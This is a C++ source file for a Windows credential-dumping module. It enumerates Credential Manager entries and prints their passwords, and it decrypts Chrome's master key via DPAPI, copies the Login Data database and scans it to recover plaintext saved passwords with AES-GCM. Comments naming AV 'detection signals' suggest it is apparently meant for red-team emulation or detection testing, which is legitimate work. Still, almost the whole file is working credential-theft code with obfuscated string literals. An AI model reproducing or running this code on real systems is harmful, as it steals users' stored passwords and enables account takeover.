#include "CredDump.h"
#include <wincred.h>
#include <wincrypt.h>
#include <bcrypt.h>
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "Bcrypt.lib")

// ── Windows Credential Manager ────────────────────────────────────────────────
// Detection signal: CredEnumerate from a non-credential-manager process.
std::string CredDump::CredMan() {
    DWORD count = 0;
    CREDENTIALA** creds = nullptr;

    if (!CredEnumerateA(NULL, 0, &count, (PCREDENTIALA**)&creds)) {
        return "CredMan: CredEnumerate failed err=" + std::to_string(GetLastError());
    }

    std::string out = "CredMan: " + std::to_string(count) + " entries\n\n";
    for (DWORD i = 0; i < count; ++i) {
        CREDENTIALA* c = creds[i];
        out += "Target:   " + std::string(c->TargetName  ? c->TargetName  : "") + "\n";
        out += "User:     " + std::string(c->UserName    ? c->UserName    : "") + "\n";
        out += "Type:     " + std::to_string(c->Type) + "\n";
        if (c->CredentialBlobSize > 0 && c->CredentialBlob) {
            std::string blob((char*)c->CredentialBlob, c->CredentialBlobSize);
            // CredentialBlob for Generic creds is UTF-16LE password
            std::string pass;
            for (size_t j = 0; j + 1 < blob.size(); j += 2) {
                char ch = blob[j];
                if (ch >= 0x20 && ch < 0x7F) pass += ch;
            }
            if (!pass.empty()) out += "Password: " + pass + "\n";
        }
        out += "---\n";
    }
    CredFree(creds);
    return out;
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Base64-decode a string using the Windows CryptoAPI (no external deps).
static std::vector<BYTE> Base64Decode(const std::string& b64) {
    DWORD sz = 0;
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                               CRYPT_STRING_BASE64, NULL, &sz, NULL, NULL)) return {};
    std::vector<BYTE> buf(sz);
    if (!CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                               CRYPT_STRING_BASE64, buf.data(), &sz, NULL, NULL)) return {};
    buf.resize(sz);
    return buf;
}

// Decrypt a DPAPI blob. Returns empty on failure.
static std::vector<BYTE> DpapiDecrypt(const BYTE* data, DWORD len) {
    DATA_BLOB in  = { len, const_cast<BYTE*>(data) };
    DATA_BLOB out = {};
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return {};
    std::vector<BYTE> r(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return r;
}

// AES-256-GCM decrypt via Windows BCrypt (no OpenSSL needed).
// nonce = 12 bytes, tag appended after ciphertext (last 16 bytes of `cipher`).
static std::string AesGcmDecrypt(const std::vector<BYTE>& key,
                                  const BYTE* nonce, DWORD nonceLen,
                                  const BYTE* cipher, DWORD cipherLen) {
    if (cipherLen < 17) return "";  // need at least tag (16) + 1 byte plaintext
    DWORD tagLen       = 16;
    DWORD payloadLen   = cipherLen - tagLen;
    const BYTE* tag    = cipher + payloadLen;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return "";

    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
        const_cast<PUCHAR>(key.data()), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = const_cast<PUCHAR>(nonce);
    authInfo.cbNonce = nonceLen;
    authInfo.pbTag   = const_cast<PUCHAR>(tag);
    authInfo.cbTag   = tagLen;

    std::vector<BYTE> plain(payloadLen + 1, 0);
    ULONG written = 0;
    NTSTATUS st = BCryptDecrypt(hKey,
        const_cast<PUCHAR>(cipher), payloadLen,
        &authInfo, NULL, 0,
        plain.data(), payloadLen, &written, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (!BCRYPT_SUCCESS(st)) return "";
    return std::string(plain.begin(), plain.begin() + written);
}

// ── Chrome saved passwords ─────────────────────────────────────────────────────
// Detection signals:
//   - Read %LOCALAPPDATA%\Google\Chrome\User Data\Local State  (AV telemetry file access)
//   - CryptUnprotectData on a DPAPI blob (AV: credential data DPAPI access)
//   - CopyFile on Chrome's Login Data SQLite  (AV: credential database copy)
//   - BCryptDecrypt (AES-256-GCM) for Chrome 80+ passwords
std::string CredDump::Chrome() {
    char localApp[MAX_PATH] = {};
    if (!GetEnvironmentVariableA(S("LOCALAPPDATA").c_str(), localApp, MAX_PATH))
        return "Chrome: LOCALAPPDATA not found";

    // ── Step 1: Read master key from Local State ──────────────────────────────
    std::string localStatePath = std::string(localApp) +
        S("\\Google\\Chrome\\User Data\\Local State");

    std::ifstream lsFile(localStatePath);
    if (!lsFile.is_open()) return "Chrome: Local State not found";

    std::string lsContent((std::istreambuf_iterator<char>(lsFile)),
                           std::istreambuf_iterator<char>());
    lsFile.close();

    // Parse JSON for os_crypt.encrypted_key
    std::vector<BYTE> masterKey;
    try {
        auto js      = nlohmann::json::parse(lsContent);
        std::string b64 = js.at("os_crypt").at("encrypted_key").get<std::string>();
        std::vector<BYTE> raw = Base64Decode(b64);
        // First 5 bytes are the ASCII string "DPAPI" — strip them.
        if (raw.size() > 5 && memcmp(raw.data(), "DPAPI", 5) == 0) {
            masterKey = DpapiDecrypt(raw.data() + 5, (DWORD)(raw.size() - 5));
        }
    } catch (...) {
        return "Chrome: could not parse Local State JSON";
    }

    // ── Step 2: Copy Login Data to temp (Chrome locks the original) ───────────
    std::string loginDataSrc = std::string(localApp) +
        S("\\Google\\Chrome\\User Data\\Default\\Login Data");
    char tmpPath[MAX_PATH] = {};
    GetTempPathA(MAX_PATH, tmpPath);
    std::string loginDataCopy = std::string(tmpPath) + S("login_data_copy");

    if (!CopyFileA(loginDataSrc.c_str(), loginDataCopy.c_str(), FALSE)) {
        return "Chrome: could not copy Login Data (err=" +
               std::to_string(GetLastError()) + ")";
    }

    // ── Step 3: Read SQLite file and scan for credential records ─────────────
    // SQLite3 stores variable-length text; rather than linking sqlite3 we do a
    // raw byte scan: passwords are stored as blobs following known signatures.
    std::ifstream dbFile(loginDataCopy, std::ios::binary);
    if (!dbFile.is_open()) {
        DeleteFileA(loginDataCopy.c_str());
        return "Chrome: could not open Login Data copy";
    }
    std::vector<BYTE> dbBytes((std::istreambuf_iterator<char>(dbFile)),
                               std::istreambuf_iterator<char>());
    dbFile.close();
    DeleteFileA(loginDataCopy.c_str());

    // Scan for "v10" magic (Chrome 80+ AES-GCM password blobs) and
    // DPAPI magic (01 00 00 00 D0 8C 9D DF ...) for older Chrome passwords.
    const BYTE dpApiMagic[]  = { 0x01,0x00,0x00,0x00,0xD0,0x8C,0x9D,0xDF };
    const BYTE v10Magic[]    = { 0x76,0x31,0x30 };  // "v10"

    std::string out;
    int found = 0;

    for (size_t i = 0; i + 3 < dbBytes.size(); ++i) {
        // v10 blob: v10 + 12-byte nonce + ciphertext (variable) + 16-byte tag
        if (memcmp(&dbBytes[i], v10Magic, 3) == 0 && masterKey.size() == 32) {
            size_t nonceOff   = i + 3;
            size_t cipherOff  = nonceOff + 12;
            // Heuristic: blobs are typically 60-256 bytes total
            for (DWORD blobLen = 60; blobLen <= 256 && cipherOff + blobLen <= dbBytes.size(); blobLen += 4) {
                std::string pass = AesGcmDecrypt(masterKey,
                    &dbBytes[nonceOff], 12,
                    &dbBytes[cipherOff], blobLen);
                if (!pass.empty() && pass.size() >= 6) {
                    out += "[AES-GCM] " + pass + "\n";
                    ++found;
                    i += 3 + 12 + blobLen; // skip over this blob
                    break;
                }
            }
        }
        // DPAPI blob: decrypt in-place (Chrome < 80)
        else if (i + sizeof(dpApiMagic) <= dbBytes.size() &&
                 memcmp(&dbBytes[i], dpApiMagic, sizeof(dpApiMagic)) == 0) {
            // Estimate blob length: DPAPI blobs start at offset i, typical size 100-300 bytes
            for (DWORD blobLen = 80; blobLen <= 400 && i + blobLen <= dbBytes.size(); blobLen += 8) {
                auto plain = DpapiDecrypt(&dbBytes[i], blobLen);
                if (!plain.empty() && plain.size() >= 4) {
                    std::string pass(plain.begin(), plain.end());
                    // Sanity check: printable ASCII
                    bool printable = true;
                    for (char c : pass) if ((unsigned char)c < 0x20 || (unsigned char)c > 0x7E) { printable = false; break; }
                    if (printable) {
                        out += "[DPAPI] " + pass + "\n";
                        ++found;
                        i += blobLen;
                        break;
                    }
                }
            }
        }
    }

    if (out.empty()) {
        return "Chrome: Login Data accessed (key=" +
               std::string(masterKey.empty() ? "none" : "ok") +
               "), no plaintext passwords recovered (may need manual SQLite parse)";
    }
    return "Chrome: " + std::to_string(found) + " password(s)\n" + out;
}
